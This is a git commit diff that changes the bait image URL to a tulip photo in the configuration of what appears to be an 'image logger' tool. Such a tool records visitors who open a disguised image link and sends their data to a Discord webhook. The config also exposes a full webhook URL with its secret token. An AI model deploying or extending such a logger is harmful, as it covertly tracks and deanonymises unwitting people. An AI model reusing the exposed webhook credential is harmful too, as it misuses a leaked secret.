9036e8f6d0467c4697ce46491cc0ebe0b8c86415
trainer01012-sys <trainer01012@gmail.com>
2026-03-02 22:33:51 +0530

    Update image URL in configuration

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1478060848550379759/B864OmIS53Fl_gHJQqXUqU8PuCujYm7mWI_NAPqKJCUjhbU9IhrpADziTwoWMxldmwMc",
-    "image": "https://i.ibb.co/HL695txg/image.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.all-free-download.com/images/graphicwebp/tulip_flower_garden_197260.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
